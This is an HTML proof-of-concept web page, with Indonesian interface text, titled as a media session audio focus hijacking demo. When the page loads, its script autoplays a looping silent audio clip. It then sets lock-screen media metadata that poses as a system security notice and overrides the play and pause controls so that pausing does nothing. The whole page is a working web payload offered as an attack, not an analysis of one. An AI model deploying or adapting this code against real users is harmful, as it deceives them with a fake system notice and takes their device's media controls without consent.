<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Media Session Audio Focus Hijacking PoC</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #090d16;
  color: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}
.panel {
  background: #111827;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
  max-width: 480px;
  width: 100%;
  border: 1px solid #1f2937;
  text-align: center;
}
h2 { 
  margin-bottom: 12px; 
  font-size: 20px;
  color: #f3f4f6;
  font-weight: 700;
}
p { 
  margin-bottom: 20px; 
  line-height: 1.5; 
  color: #9ca3af;
  font-size: 13px;
}
#status {
  margin-top: 15px;
  font-weight: 500;
  color: #38bdf8;
  padding: 12px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 8px;
  font-size: 12px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
</style>
</head>

<body>
<div class="panel">
  <h2>Media Session Controller</h2>
  <p>Menginisialisasi perebutan fokus audio sistem dan pengambilalihan kontrol media latar belakang.</p>
  <div id="status" role="status">Menyiapkan modul audio...</div>
</div>

<audio id="silent-audio" loop preload="auto">
  <!-- Audio hening berbasis data URI untuk mempertahankan masa aktif fokus audio -->
  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
</audio>

<script>
'use strict';

const statusDiv = document.getElementById("status");
const audioEl = document.getElementById("silent-audio");

window.addEventListener('DOMContentLoaded', () => {
  statusDiv.textContent = "Meminta izin fokus audio sistem...";

  // 1. Memaksa pemutaran elemen audio (memerlukan intervensi awal atau bypass konteks aman)
  audioEl.play().then(() => {
    statusDiv.textContent = "Audio aktif: Fokus audio berhasil dibajak.";

    // 2. Mendaftarkan Media Session API untuk mengunci kontrol notifikasi sistem
    if ('mediaSession' in navigator) {
      navigator.mediaSession.metadata = new MediaMetadata({
        title: 'System Security Sync Notice',
        artist: 'Background Service Dispatcher',
        album: 'Secure Enclave Session',
        artwork: [
          { src: 'https://via.placeholder.com/512', sizes: '512x512', type: 'image/png' }
        ]
      });

      // Mengambil alih tombol aksi pemutaran sistem operasi (Lock Screen / Notification Panel)
      navigator.mediaSession.setActionHandler('play', function() {
        statusDiv.textContent = "Aksi 'Play' sistem dipintas.";
        audioEl.play();
      });
      navigator.mediaSession.setActionHandler('pause', function() {
        statusDiv.textContent = "Aksi 'Pause' sistem dipintas.";
      });
      navigator.mediaSession.setActionHandler('seekbackward', function() {});
      navigator.mediaSession.setActionHandler('seekforward', function() {});
    }

  }).catch((err) => {
    statusDiv.textContent = "Gagal memicu fokus audio secara otomatis: " + err.message;
    console.error("Audio playback error:", err);
  });
});
</script>
</body>
</html>
